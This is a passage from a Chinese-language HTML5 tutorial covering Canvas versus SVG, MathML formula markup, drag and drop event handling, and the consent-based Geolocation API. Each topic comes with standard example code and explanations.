中，一旦图形被绘制完成，它就不会继续得到浏览器的关注。如果其位置发生变化，那么整个场景也需要重新绘制，包括任何或许已被图形覆盖的对象。</p><p><strong>两者的比较</strong></p><p><strong>Canvas</strong></p><ul><li>依赖分辨率</li><li>不支持事件处理器</li><li>弱的文本渲染能力</li><li>能够以 .png 或 .jpg 格式保存结果图像</li><li>最适合图像密集型的游戏，其中的许多对象会被频繁重绘</li></ul><p><strong>SVG</strong></p><ul><li>不依赖分辨率</li><li>支持事件处理器</li><li>最适合带有大型渲染区域的应用程序（比如谷歌地图）</li><li>复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快）</li><li>不适合游戏应用</li></ul><h2 id="3-MathML"><a href="#3-MathML" class="headerlink" title="3.MathML"></a>3.MathML</h2><p>MathML 是数学标记语言，是一种基于XML（标准通用标记语言的子集）的标准，用来在互联网上书写数学符号和公式的置标语言。</p><p>MathML 与 HTML相似度很高，但是比较繁琐。它继承了角括号和双标签（&lt;标签&gt;内容&lt;/标签&gt;）的用法。<br>HTML5 可以在文档中使用 MathML 元素，对应的标签是 &lt;math&gt;…&lt;/math&gt; 。</p><p>使用实例1：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>W3Cschool在线教程(w3cschool.cn)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">math</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">mrow</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">msup</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">msup</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">msup</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>b<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">msup</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>=<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">msup</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>c<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">msup</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">mrow</span>&gt;</span><br><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">math</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>运行结果：<br>a<sup>2</sup>+b<sup>2</sup>=c<sup>2</sup></p><p>使用实例2：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>W3Cschool在线教程(w3cschool.cn)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">math</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">mrow</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mrow</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">msup</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><br>               <span class="hljs-tag">&lt;/<span class="hljs-name">msup</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">mrow</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>⁢<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><br>               <span class="hljs-tag">&lt;/<span class="hljs-name">mrow</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>               <span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">mrow</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>=<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mn</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">mn</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">mrow</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">math</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>运行结果：<br>x<sup>2</sup>+4x+4=0</p><p>使用实例3：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>W3Cschool在线教程(w3cschool.cn)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">math</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">mrow</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>A<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mo</span>&gt;</span>=<span class="hljs-tag">&lt;/<span class="hljs-name">mo</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">mfenced</span> <span class="hljs-attr">open</span>=<span class="hljs-string">&quot;[&quot;</span> <span class="hljs-attr">close</span>=<span class="hljs-string">&quot;]&quot;</span>&gt;</span><br><br>               <span class="hljs-tag">&lt;<span class="hljs-name">mtable</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mtr</span>&gt;</span><br>                     <span class="hljs-tag">&lt;<span class="hljs-name">mtd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mtd</span>&gt;</span><br>                     <span class="hljs-tag">&lt;<span class="hljs-name">mtd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>y<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mtd</span>&gt;</span><br>                  <span class="hljs-tag">&lt;/<span class="hljs-name">mtr</span>&gt;</span><br><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">mtr</span>&gt;</span><br>                     <span class="hljs-tag">&lt;<span class="hljs-name">mtd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>z<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mtd</span>&gt;</span><br>                     <span class="hljs-tag">&lt;<span class="hljs-name">mtd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mi</span>&gt;</span>w<span class="hljs-tag">&lt;/<span class="hljs-name">mi</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mtd</span>&gt;</span><br>                  <span class="hljs-tag">&lt;/<span class="hljs-name">mtr</span>&gt;</span><br>               <span class="hljs-tag">&lt;/<span class="hljs-name">mtable</span>&gt;</span><br>               <br>            <span class="hljs-tag">&lt;/<span class="hljs-name">mfenced</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">mrow</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">math</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>实例是一个 2×2 矩阵，可以在 Firefox 3.5 以上版本查看到效果。</p><h2 id="4-拖放（Drag和Drop）"><a href="#4-拖放（Drag和Drop）" class="headerlink" title="4.拖放（Drag和Drop）"></a>4.拖放（Drag和Drop）</h2><p>拖放的目的是可以让你将某个对象放置到你想要放置的位置。拖放（Drag 和 drop）是 HTML5 标准的组成部分。</p><p>拖放是一种常见的特性，即抓取对象以后拖到另一个位置。在 HTML5 中，拖放是标准的一部分，任何元素都能够拖放。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">allowDrop</span>(<span class="hljs-params">ev</span>)</span>&#123;</span><br>ev.preventDefault();<br>&#125;<br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">drag</span>(<span class="hljs-params">ev</span>)</span>&#123;</span><br><span class="javascript">ev.dataTransfer.setData(<span class="hljs-string">&quot;Text&quot;</span>,ev.target.id);</span><br>&#125;<br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">drop</span>(<span class="hljs-params">ev</span>)</span>&#123;</span><br>ev.preventDefault();<br><span class="javascript"><span class="hljs-keyword">var</span> data=ev.dataTransfer.getData(<span class="hljs-string">&quot;Text&quot;</span>);</span><br><span class="javascript">ev.target.appendChild(<span class="hljs-built_in">document</span>.getElementById(data));</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;div1&quot;</span> <span class="hljs-attr">ondrop</span>=<span class="hljs-string">&quot;drop(event)&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">ondragover</span>=<span class="hljs-string">&quot;allowDrop(event)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;drag1&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img_logo.gif&quot;</span> <span class="hljs-attr">draggable</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">ondragstart</span>=<span class="hljs-string">&quot;drag(event)&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;336&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;69&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>看上去也许有些复杂，不过我们可以分别研究拖放事件的不同部分。</p><h3 id="4-1-设置元素为可拖放（draggable）"><a href="#4-1-设置元素为可拖放（draggable）" class="headerlink" title="4.1 设置元素为可拖放（draggable）"></a>4.1 设置元素为可拖放（draggable）</h3><p>为了使元素可拖动，把 draggable 属性设置为 true ：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">draggable</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-拖动什么（ondragstart和setData-）"><a href="#4-2-拖动什么（ondragstart和setData-）" class="headerlink" title="4.2 拖动什么（ondragstart和setData()）"></a>4.2 拖动什么（ondragstart和setData()）</h3><p>规定当元素被拖动时，会发生什么。在上面的例子中，ondragstart 属性调用了一个函数，drag(event)，它规定了被拖动的数据。</p><p>dataTransfer.setData() 方法设置被拖数据的数据类型和值：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">function drag(ev)        &#123;<br>ev.dataTransfer.setData(&quot;Text&quot;,ev.target.id);       <br>&#125;<br></code></pre></div></td></tr></table></figure><p>数据类型是 “Text”，值是可拖动元素的 id (“drag1”)。</p><h3 id="4-3-放到何处（ondragover）"><a href="#4-3-放到何处（ondragover）" class="headerlink" title="4.3 放到何处（ondragover）"></a>4.3 放到何处（ondragover）</h3><p>规定在何处放置被拖动的数据。默认地，无法将数据/元素放置到其他元素中。如果需要设置允许放置，我们必须阻止对元素的默认处理方式。<br>需要通过调用 ondragover 事件的 event.preventDefault() 方法：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">event.preventDefault()<br></code></pre></div></td></tr></table></figure><h3 id="4-4-进行放置（ondrop）"><a href="#4-4-进行放置（ondrop）" class="headerlink" title="4.4 进行放置（ondrop）"></a>4.4 进行放置（ondrop）</h3><p>当放置被拖数据时，会发生 drop 事件。<br>在上面的例子中，ondrop 属性调用了一个函数，drop(event)：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">function drop(ev)&#123;        <br>ev.preventDefault();        <br>var data=ev.dataTransfer.getData(&quot;Text&quot;);        <br>ev.target.appendChild(document.getElementById(data));        <br>&#125;<br></code></pre></div></td></tr></table></figure><p>代码解析：</p><ul><li>调用 preventDefault() 来避免浏览器对数据的默认处理（drop 事件的默认行为是以链接形式打开）。</li><li>通过 dataTransfer.getData(“Text”) 方法获得被拖的数据。该方法将返回在 setData() 方法中设置为相同类型的任何数据。</li><li>被拖数据是被拖元素的 id (“drag1”)。</li><li>把被拖元素追加到放置元素（目标元素）中。</li></ul><h2 id="5-地理位置（Geolocation）"><a href="#5-地理位置（Geolocation）" class="headerlink" title="5.地理位置（Geolocation）"></a>5.地理位置（Geolocation）</h2><p>HTML5 Geolocation（地理定位）用于定位用户的位置。Geolocation 通过请求一个位置信息，用户同意后，浏览器会返回一个包含经度和维度的位置信息！HTML5 Geolocation API 用于获得用户的地理位置。该特性可能侵犯用户的隐私，除非用户同意，否则用户位置信息是不可用的。</p><h3 id="5-1-使用地理定位"><a href="#5-1-使用地理定位" class="headerlink" title="5.1 使用地理定位"></a>5.1 使用地理定位</h3><p>使用 getCurrentPosition() 方法来获得用户的位置。</p><p>使用实例：可返回用户位置的经度和纬度:</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> x=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>);</span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLocation</span>(<span class="hljs-params"></span>)</span></span><br>  &#123;<br>  if (navigator.geolocation)<br>    &#123;<br>    navigator.geolocation.getCurrentPosition(showPosition);<br>    &#125;<br><span class="javascript">  <span class="hljs-keyword">else</span>&#123;x.innerHTML=<span class="hljs-string">&quot;该浏览器不支持获取地理位置。&quot;</span>;&#125;</span><br>  &#125;<br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">showPosition</span>(<span class="hljs-params">position</span>)</span></span><br>  &#123;<br><span class="javascript">  x.innerHTML=<span class="hljs-string">&quot;Latitude: &quot;</span> + position.coords.latitude +</span><br><span class="javascript">  <span class="hljs-string">&quot;&lt;br&gt;Longitude: &quot;</span> + position.coords.longitude;</span><br>  &#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>代码解析：</p><ul><li>检测是否支持地理定位</li><li>如果支持，则运行 getCurrentPosition() 方法。如果不支持，则向用户显示一段消息。</li><li>如果getCurrentPosition()运行成功，则向参数showPosition中规定的函数返回一个coordinates对象</li><li>showPosition() 函数获得并显示经度和纬度</li></ul><p>上面的例子是一个非常基础的地理定位脚本，不含错误处理。</p><p><strong>提示：</strong>geolocation的位置信息来源可以包括GPS、IP地址、RFID、WIFI和蓝牙的MAC地址、以及GSM/CDMS的ID等等。</p><h3 id="5-2-处理错误和拒绝"><a href="#5-2-处理错误和拒绝" class="headerlink" title="5.2 处理错误和拒绝"></a>5.2 处理错误和拒绝</h3><p>getCurrentPosition() 方法的第二个参数用于处理错误。它规定当获取用户位置失败时运行的函数。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">function showError(error)<br>  &#123;<br>  switch(error.code)<br>    &#123;<br>    case error.PERMISSION_DENIED:<br>      x.innerHTML=&quot;用户拒绝对获取地理位置的请求。&quot;<br>      break;<br>    case error.POSITION_UNAVAILABLE:<br>      x.innerHTML=&quot;位置信息是不可用的。&quot;<br>      break;<br>    case error.TIMEOUT:<br>      x.innerHTML=&quot;请求用户地理位置超时。&quot;<br>      break;<br>    case error.UNKNOWN_ERROR:<br>      x.innerHTML=&quot;未知错误。&quot;<br>      break;<br>    &#125;<br>  &#125;<br></code></pre></div></td></tr></table></figure><p>解析：</p><ul><li>Permission denied ： 用户不允许地理定位</li><li>Position unavailable ： 无法获取当前位置</li><li>Timeout ： 操作超时</li></ul><h3 id="5-3-在地图中显示结果"><a href="#5-3-在地图中显示结果" class="headerlink" title="5.3 在地图中显示结果"></a>5.3 在地图中显示结果</h3><p>如需在地图中显示结果，您需要访问可使用经纬度的地图服务，比如谷歌地图或百度地图。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">function showPosition(position)<br>&#123;<br>var latlon=position.coords.latitude+&quot;,&quot;+position.coords.longitude;<br><br>var img_url=&quot;http://maps.googleapis.com/maps/api/staticmap?center=&quot;<br>+latlon+&quot;&amp;zoom=14&amp;size=400x300&amp;sensor=false&quot;;<br><br>document.getElementById(&quot;mapholder&quot;).innerHTML=&quot;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;&quot;+img_url+&quot;&#x27;</span>&gt;</span>&quot;;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在上例中，我们使用返回的经纬度数据在谷歌地图中显示位置（使用静态图像）。</p><h3 id="5-4-返回数据（getCurrentPosition-）"><a href="#5-4-返回数据（getCurrentPosition-）" class="headerlink" title="5.4  返回数据（getCurrentPosition() ）"></a>5.4  返回数据（getCurrentPosition() ）</h3><p>T若成功，则 getCurrentPosition() 方法返回对象。始终会返回 latitude、longitude 以及 accuracy 属性。如果可用，则会返回其他下面的属性。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">coords.latitude</td><td align="center">十进制数的纬度</td></tr><tr><td align="center">coords.longitude</td><td align="center">十进制数的经度</td></tr><tr><td align="center">coords.accuracy</td><td align="center">位置精度</td></tr><tr><td align="center">coords.altitude</td><td align="center">海拔，海平面以上以米计</td></tr><tr><td align="center">coords.altitudeAccuracy</td><td align="center">位置的海拔精度</td></tr><tr><td align="center">coords.heading</td><td align="center">方向，从正北开始以度计</td></tr><tr><td align="center">coords.speed</td><td align="center">速度，以米/每秒计</td></tr><tr><td align="center">timestamp</td><td align="center">响应的日期/时间</td></tr></tbody></table><h3 id="5-5-其他方法（Geolocation-对象）"><a href="#5-5-其他方法（Geolocation-对象）" class="headerlink" title="5.5 其他方法（Geolocation 对象）"></a>5.5 其他方法（Geolocation 对象）</h3><p>watchPosition() - 返回用户的当前位置，并继续返回用户移动时的更新位置（就像汽车上的 GPS）。</p><p>clearWatch() - 停止 watchPosition() 方法。<br>展示使用watchPosition() 方法。您需要一台精确的 GPS 设备来测试该例（比如 iPhone）：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> x=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>);</span><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLocation</span>(<span class="hljs-params"></span>)</span></span><br>  &#123;<br>  if (navigator.geolocation)<br>    &#123;<br>    navigator.geolocation.watchPosition(showPosition);<br>    &#125;<br><span class="javascript">  <span class="hljs-keyword">else</span>&#123;x.innerHTML=<span class="hljs-string">&quot;该浏览器不支持获取地理位置。&quot;</span>;&#125;</span><br>  &#125;<br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">showPosition</span>(<span class="hljs-params">position</span>)</span></span><br>  &#123;<br><span class="javascript">  x.innerHTML=<span class="hljs-string">&quot;纬度: &quot;</span> + position.coords.latitude +</span><br><span class="javascript">  <span class="hljs-string">&quot;&lt;br&gt;经度: &quot;</span> + position.coords.longitude;</span><br>  &#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
